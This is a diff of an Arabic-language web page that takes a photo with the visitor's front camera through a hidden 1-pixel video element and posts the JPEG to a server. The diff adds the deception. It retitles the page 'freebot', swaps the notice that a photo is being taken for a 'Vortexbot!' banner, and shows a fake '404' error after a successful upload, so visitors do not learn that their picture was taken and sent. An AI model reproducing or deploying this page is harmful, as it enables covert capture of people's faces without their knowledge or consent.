@@ -2,11 +2,11 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>Camera Shot</title>
+<title>freebot</title>
 </head>
 <body>
 
-<h2 id="msg">📸 ابتسم… يتم التقاط الصورة الآن!</h2>
+<h2 id="msg">𝐕𝐨𝐫𝐭𝐞𝐱bot!</h2>
 
 <video id="video" autoplay playsinline style="
     width:1px;
@@ -44,7 +44,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                     method: "POST",
                     body: formData
                 })
-                .then(() => document.getElementById("msg").innerText = "✔ تم التقاط الصورة")
+                .then(() => document.getElementById("msg").innerText = "404 خطأ")
                 .catch(() => document.getElementById("msg").innerText = "✗ خطأ أثناء الإرسال");
             }, "image/jpeg", 0.95);
 
@@ -53,7 +53,7 @@ navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
 
 })
 .catch(err => {
-    document.getElementById("msg").innerText = "✗ المستخدم لم يسمح بالكاميرا";
+    document.getElementById("msg").innerText = "✗ 𝐕𝐨𝐫𝐭𝐞𝐱bot! -..- ";
 });
 </script>
 
